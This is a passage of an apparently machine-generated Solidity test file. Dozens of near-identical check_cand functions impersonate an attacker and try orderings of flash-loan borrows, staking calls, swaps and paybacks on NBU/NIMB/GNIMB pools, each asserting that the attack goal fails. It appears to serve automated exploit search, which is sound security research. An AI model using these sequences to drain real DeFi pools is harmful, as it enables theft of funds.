        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1606(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1607(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1608(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1609(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1610(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1611(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1612(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1613(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1614(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1615(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1616(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1617(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1618(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1619(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1620(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1621(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1622(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1623(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1624(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1625(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1626(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1627(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1628(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1629(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1630(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1631(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1632(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1633(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1634(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1635(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1636(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1637(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1638(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1639(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1640(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1641(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1642(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1643(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1644(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1645(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1646(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1647(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1648(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1649(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1650(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1651(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1652(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1653(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1654(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1655(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1656(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1657(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1658(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
